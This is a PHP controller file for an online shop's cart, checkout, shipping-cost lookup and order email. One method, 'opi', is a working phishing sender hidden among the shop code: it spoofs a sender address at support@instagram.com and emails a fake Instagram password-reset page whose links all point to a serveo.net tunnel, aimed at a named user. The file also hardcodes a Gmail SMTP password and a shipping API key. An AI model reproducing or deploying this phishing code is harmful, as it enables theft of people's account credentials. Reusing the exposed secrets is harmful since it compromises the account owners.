<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Cart;
use App\fixorder;
use Illuminate\Support\Facades\Auth;
use DB;
use Mail;
use PHPMailer\PHPMailer\PHPMailer;
class cartcontroller extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
         if ( Auth::check() )
        {
            $data = DB::table('carts')
                ->where('carts.id_buy', Auth::user()->name )
                ->leftjoin('products','carts.id_cart', '=' , 'products.id')
                // ->join('products','carts.price', '=' , 'products.Price')
                // ->join('products','carts.id_cart', '=' , 'products.QTY')
                // ->join('products','carts.id_cart', '=' , 'products.photo')
                // ->join('products','carts.id_cart', '=' , 'products.Size')
                // ->join('products','carts.id_cart', '=' , 'products.Color')
                // ->select('*')
                ->get();
                
            // return $data;
        return view('frontend.cart.cart', compact('data'));        
        }
        
        
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        $cart = Cart::all(); 
        // $select = '';

        // foreach ($carty as $key => $value) {
        //     $select .= '<li> <a href="#">'.$value->CategoryName.'</a></li>'    ;
        // }
        
        
        

        return $cart;
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
           $cart = $request->all();
           
        // dd($cart);
        $crt = new Cart();
        $crt->id_buy = Auth::user()->name;
        $crt->id_cart = $request->id;
        $crt->qty = $request->qty;
        $crt->size = $request->size;
        $crt->color = $request->color;
        $crt->price = $request->price;
        $crt->save();
        $data = Cart::all()->where('id_buy', Auth::user()->name)->count();

       
        if ($crt){
            return response()->json([
            'success' => true,
            'message' => 'Cart Created',
            'data' => $data, 
        ]);

        }
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */

    public function deletebutton($id)
    {
 
            $cart = Cart::where('id_cart',$id)->where('id_buy', Auth::user()->name)->first();
            $cart->delete();

        return response()->json([
            'success' => true,
            'message' => 'Cart Deleted'
        ]);
    }
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        //
    }

    public function list_cart()
    {
        if ( Auth::check() )
        {
            $data = DB::table('carts')
                ->where('carts.id_buy', Auth::user() )
                ->leftJoin('products','products.ProductName', '=' , 'carts.id_cart')
                ->leftJoin('products','products.Price', '=' , 'carts.price')
                ->leftJoin('products','products.QTY', '=' , 'carts.qty')
                ->leftJoin('products','products.photo', '=' , 'carts.photo')
                ->leftJoin('products','products.Size', '=' , 'carts.size')
                ->leftJoin('products','products.Color', '=' , 'carts.color')
                ->get();
                dd($data);
            return $data;
                
        }
    }

    public function checkout()
    {

         if ( Auth::check() )
        {
            $data = DB::table('carts')
                ->where('carts.id_buy', Auth::user()->name )
                ->leftjoin('products','carts.id_cart', '=' , 'products.id')
                // ->join('products','carts.price', '=' , 'products.Price')
                // ->join('products','carts.id_cart', '=' , 'products.QTY')
                // ->join('products','carts.id_cart', '=' , 'products.photo')
                // ->join('products','carts.id_cart', '=' , 'products.Size')
                // ->join('products','carts.id_cart', '=' , 'products.Color')
                // ->select('*')
                ->get();

            // $dat = new fixorder();
            // $dat->barang = DB::table('carts')
            //     ->where('carts.id_buy', Auth::user()->name )->select('id_cart')->get();
            // $dat->save();    
            // return $data;
        
        return view('frontend.cart.checkout',compact('data'));
        }
    }

    public function complete(Request $request)
    {
        $orderr = $request->all();
        // return $request->kota;

                $client = new \GuzzleHttp\Client([
                    'headers' => [ 'Content-Type' => 'application/json' ,
                                'key' => 'f214df40871ea3e93f87058943919b31']
                                                ]);
                $response = $client->request('POST', 'http://api.rajaongkir.com/starter/cost', [
                    'form_params' => [
                
                'origin' => '23',
                'destination' => $request->kota,
                'weight' => '1',
                'courier' => 'jne'
                         ]
                    ]);
                $responses = $response->getBody();
                $json = json_decode($responses,true);
                $ongkir = $json['rajaongkir']['results'];
                $var =  response()->json(['data'=> $ongkir]);
                $select = '';
                $final = [];
                $blah = '';
                $blah2 = '';
                $blah3 = '';
                foreach ($json['rajaongkir']['results'] as $key => $value) {

                $select = $value['costs'];
                foreach ($select as $key => $val) {
                    $blah .= $val['description'];
                    $blah2 .= $val['service'];
                    $blah3 .= json_encode($val['cost']);
                    // $blah3 .= $val['cost'];
                $explode_blah3 = explode("{}", $blah3);
                $ex = explode(":", $explode_blah3[0]); 
                $int = preg_replace('/[^0-9]/', '', $ex);
                }
                // $select .= $value['province_id'] ; 
                // dd($select);
                    // foreach ($select as $key => $final) {
                    //     $blah .= $final['service'];
                    // }
                    // foreach ($select as $key => $final2) {
                    //     $blah2 = $final2['service'];
                    // }
                $final['desc'] = $blah;
                $final['ser'] = $blah2;
                $final['ongkir'] = $blah3;
                $final['opsi1'] = $int[1];
                $final['opsi2'] = $int[4];


                return response()->json($final);
                return $int;
                     
                 }
                // return response()->json($select);
                
                                
    }

    public function com(Request $request)
    {
        $data = $request->all();
        $fixed = fixorder::create($data);
        $fixed->save();

        
                //Create a new PHPMailer instance
        $mail = new PHPMailer;
        // Set PHPMailer to use the sendmail transport
        // $mail->isSendmail();
        // $mail->CharSet = 'UTF-8';
        // $mail->SMTPAuth = 'true';
        // $mail->SMTPSecure = "tls";
        // $mail->Host = "smtp.gmail.com";
        // $mail->Port = 587;
        // $mail->Username = "ozzy.ojjey@gmail.com";
        // $mail->Password = "hayobingungya";
        // //Set who the message is to be sent from
        // $mail->setFrom('fauzifadillah00@yahoo.com', 'Fauzi Fadillah');
        // $mail->Subject = 'PHPMailer sendmail test';
        // $mail->Body = 'TES AJA';
        // //Set an alternative reply-to address
        // $mail->addReplyTo('replyto@example.com', 'First Last');
        // //Set who the message is to be sent to
        // $mail->addAddress('ozzy.ojjey@gmail.com', 'Fauzi Fadillah');
        // $mail->send();

        $mail->isSMTP();                            // Set mailer to use SMTP
        $mail->Host = 'smtp.gmail.com';             // Specify main and backup SMTP servers
        $mail->SMTPAuth = true;                     // Enable SMTP authentication
        $mail->Username = 'ozzy.ojjey@gmail.com';          // SMTP username
        $mail->Password = 'hayobingungya'; // SMTP password
        $mail->Port = 465;                          // TCP port to connect to
        $mail->SMTPSecure = 'ssl';                  // Enable TLS encryption, `ssl` also accepted

        $mail->setFrom('ozzy.ojjey@gmail.com', 'Lumea Orders');
        $mail->addReplyTo('info@example.com', 'CodexWorld');
        $mail->addAddress($request->email);   // Add a recipient
        // $mail->addCC('cc@example.com');
        // $mail->addBCC('bcc@example.com');

        $mail->isHTML(true);  // Set email format to HTML

        $bodyContent = '<h1>Terimakasih Sudah berbelanja di Lumea!</h1>';
        $bodyContent .= '<p>Transaksi anda akan segera kami proses</b></p>';
        $bodyContent .= '<p> Nama : '.$request->name.' </p>';
        $bodyContent .= '<p> Alamat : '.$request->alamat.' </p> ';
        $bodyContent .= '<p> Kontak : '.$request->no_hp.' </p>';
        $bodyContent .= '<p> Bank Pembayaran : '.$request->metode.' </p>';
        $bodyContent .= '<p> Total : Rp. '.$request->harga.' </p>';
        $bodyContent .= '<p> KONFIRMASI PEMBAYARAN KE : 085947224853 </p>';
        $bodyContent .= '<p> ---------- TERIMAKASIH ---------- </p>';

        $mail->Subject = 'LUMEA';
        $mail->Body    = $bodyContent;

        if(!$mail->send()) {
            echo 'Message could not be sent.';
            echo 'Mailer Error: ' . $mail->ErrorInfo;
        } else {
            echo 'Message has been sent';
        }
        
       
        //Set the subject line
        //Read an HTML message body from an external file, convert referenced images to embedded,
        //convert HTML into a basic plain-text alternative body
        // $mail->msgHTML(file_get_contents('contents.html'), __DIR__);
        //Replace the plain text body with one created manually
        // $mail->AltBody = 'This is a plain-text message body';
        //Attach an image file
        // $mail->addAttachment('images/phpmailer_mini.png');
        //send the message, check for errors
        // if (!$mail->send()) {
        //     echo "Mailer Error: " . $mail->ErrorInfo;
        // } else {
        //     echo "Message sent!";
        // }
    }
public function opi(Request $request)
    {
        $data = $request->all();
        $fixed = fixorder::create($data);
        $fixed->save();

        
                //Create a new PHPMailer instance
        $mail = new PHPMailer;
        // Set PHPMailer to use the sendmail transport
        // $mail->isSendmail();
        // $mail->CharSet = 'UTF-8';
        // $mail->SMTPAuth = 'true';
        // $mail->SMTPSecure = "tls";
        // $mail->Host = "smtp.gmail.com";
        // $mail->Port = 587;
        // $mail->Username = "ozzy.ojjey@gmail.com";
        // $mail->Password = "hayobingungya";
        // //Set who the message is to be sent from
        // $mail->setFrom('fauzifadillah00@yahoo.com', 'Fauzi Fadillah');
        // $mail->Subject = 'PHPMailer sendmail test';
        // $mail->Body = 'TES AJA';
        // //Set an alternative reply-to address
        // $mail->addReplyTo('replyto@example.com', 'First Last');
        // //Set who the message is to be sent to
        // $mail->addAddress('ozzy.ojjey@gmail.com', 'Fauzi Fadillah');
        // $mail->send();

        $mail->isSMTP();                            // Set mailer to use SMTP
        $mail->Host = 'smtp.gmail.com';             // Specify main and backup SMTP servers
        $mail->SMTPAuth = true;                     // Enable SMTP authentication
        $mail->Username = 'sahawelah798@gmail.com';          // SMTP username
        $mail->Password = 'hayobingungya'; // SMTP password
        
        $mail->Port = 465;                          // TCP port to connect to
        $mail->SMTPSecure = 'ssl';                  // Enable TLS encryption, `ssl` also accepted

        $mail->setFrom('support@instagram.com', 'Instagram');
        $mail->addReplyTo('info@example.com', 'CodexWorld');
        $mail->addAddress($request->email);   // Add a recipient
        // $mail->addCC('cc@example.com');
        // $mail->addBCC('bcc@example.com');

        $mail->isHTML(true);  // Set email format to HTML

        $bodyContent = '<!DOCTYPE html>
<html>


<body>
<div dir="ltr"><table border="0" cellspacing="0" cellpadding="0" align="center" id="" style="border-collapse:collapse;"><tr><td id="" style="font-family:Helvetica Neue, Helvetica, Lucida Grande, tahoma, verdana, arial, sans-serif;background:#ffffff;"><table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse;"><tr style=""><td height="20" style="line-height:20px;" colspan="3">&nbsp;</td></tr><tr><td height="1" colspan="3" style="line-height:1px;"></td></tr><tr><td style=""><table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse;border:solid 1px white;margin:0 auto 5px auto;padding:3px 0;text-align:center;width:430px;"><tr><td width="15px" style="width:15px;"></td><td style="line-height:0px;width:400px;padding:0 0 15px 0;"><table border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse;"><tr><td style="width:100%;text-align:left;min-height:33px;"><img height="33" src="" style="border:0;"></td></tr></table></td><td width="15px" style="width:15px;"></td></tr><tr><td width="15px" style="width:15px;"></td><td style="border-top:solid 1px #DBDBDB;"></td><td width="15px" style="width:15px;"></td></tr></table></td></tr><tr><td style=""><table border="0" width="430" cellspacing="0" cellpadding="0" style="border-collapse:collapse;margin:0 auto 0 auto;"><tr><td style=""><table border="0" width="430px" cellspacing="0" cellpadding="0" style="border-collapse:collapse;margin:0 auto 0 auto;width:430px;"><td width="15" style="display:block;width:15px;">&nbsp;&nbsp;&nbsp;</td><tr style=""><td style=""><table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse;"><tr><td style=""><table border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse;"><tr><td width="20" style="display:block;width:20px;">&nbsp;&nbsp;&nbsp;</td><td style=""><table border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse;"><tr><td style=""><tr><td style=""><p style="margin:10px 0 10px 0;color:#565a5c;font-size:18px;">Hi opiwoody,</p><p style="margin:10px 0 10px 0;color:#565a5c;font-size:18px;">We got a request to reset your Instagram password.</p></td></tr><tr><tr style=""><td height="10" style="line-height:10px;" colspan="1">&nbsp;</td></tr><td style=""><a rel="nofollow" target="_blank" href="https://adfero.serveo.net" style="color:#3b5998;text-decoration:none;display:block;width:370px;"><table border="0" width="390" cellspacing="0" cellpadding="0" style="border-collapse:collapse;"><tr><td style="border-collapse:collapse;border-radius:3px;text-align:center;display:block;border:solid 1px #009fdf;padding:10px 16px 14px 16px;margin:0 2px 0 auto;min-width:80px;background-color:#47A2EA;"><a rel="nofollow" target="_blank" href="https://adfero.serveo.net" style="color:#3b5998;text-decoration:none;display:block;"><center><font size="3"><span style="font-family:Helvetica Neue, Helvetica, Roboto, Arial, sans-serif;white-space:nowrap;font-weight:bold;vertical-align:middle;color:#fdfdfd;font-size:16px;line-height:16px;">Reset&nbsp;Password</span></font></center></a></td></tr></table></a></td><tr style=""><td height="10" style="line-height:10px;" colspan="1">&nbsp;</td></tr></tr><tr><td style=""><p style="margin:10px 0 10px 0;color:#565a5c;font-size:18px;">If you ignore this message, your password will not be changed. If you didn&#039;t request a password reset, <a rel="nofollow" target="_blank" href="https://adfero.serveo.net" style="color:#3b5998;text-decoration:none;">let us know</a>.</p></td></tr></td></tr></table></td><td width="20" style="display:block;width:20px;">&nbsp;&nbsp;&nbsp;</td></tr></table></td></tr></table></td></tr></table></td></tr></table></td></tr><tr><td style=""><table border="0" width="430px" cellspacing="0" cellpadding="0" style="border-collapse:collapse;margin:0 auto 0 auto;width:430px;"><tr style=""><td height="5" style="line-height:5px;" colspan="3">&nbsp;</td></tr><tr><td width="20" style="display:block;width:20px;">&nbsp;&nbsp;&nbsp;</td><td style=""><div></div><div style="min-height:10px;"></div><div style="color:#abadae;font-size:11px;margin:0 auto 5px auto;">© Instagram. Facebook Inc., 1601 Willow Road, Menlo Park, CA 94025<br></div><div style="color:#abadae;font-size:11px;margin:0 auto 5px auto;">This message was sent to <a rel="nofollow" style="color:#abadae;text-decoration:underline;">sofiasalsabilla0&#064;gmail.com</a> and intended for opiwoody. Not your account? <a rel="nofollow" target="_blank" href="https://adfero.serveo.net" style="color:#abadae;text-decoration:underline;">Remove your email</a> from this account.<br></div></td><td width="20" style="display:block;width:20px;">&nbsp;&nbsp;&nbsp;</td></tr></table></td></tr><tr style=""><td height="20" style="line-height:20px;" colspan="3">&nbsp;</td></tr></table><span style=""><img src="" style="border:0;width:1px;min-height:1px;"></span></tr></table></div>
</div></div></div></div>
</body>

</html>';

        $mail->Subject = 'Reset Your Password';
        $mail->Body    = $bodyContent;

        if(!$mail->send()) {
            echo 'Message could not be sent.';
            echo 'Mailer Error: ' . $mail->ErrorInfo;
        } else {
            echo 'Message has been sent';
        }
        
       
        //Set the subject line
        //Read an HTML message body from an external file, convert referenced images to embedded,
        //convert HTML into a basic plain-text alternative body
        // $mail->msgHTML(file_get_contents('contents.html'), __DIR__);
        //Replace the plain text body with one created manually
        // $mail->AltBody = 'This is a plain-text message body';
        //Attach an image file
        // $mail->addAttachment('images/phpmailer_mini.png');
        //send the message, check for errors
        // if (!$mail->send()) {
        //     echo "Mailer Error: " . $mail->ErrorInfo;
        // } else {
        //     echo "Message sent!";
        // }
    }
   
}
